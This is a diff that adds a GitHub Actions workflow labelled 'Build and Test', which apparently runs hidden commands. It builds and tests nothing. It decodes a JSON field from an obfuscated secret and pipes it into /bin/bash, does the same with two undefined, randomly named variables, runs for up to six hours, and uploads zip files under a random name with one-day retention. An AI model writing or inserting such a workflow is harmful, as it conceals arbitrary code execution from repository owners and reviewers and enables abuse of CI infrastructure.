@@ -1,0 +1,27 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          bj17: ${{ secrets.bj17 }}
+        run: |
+          printf '%s' "$bj17" | jq -r .ifviy60 | /bin/bash
+          echo $yxeag29 | jq -r .pouuh9 | /bin/bash
+          echo $xf28793 | jq -r .x7478 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: SriCAskT
+          path: "*.zip"
+          retention-days: 1
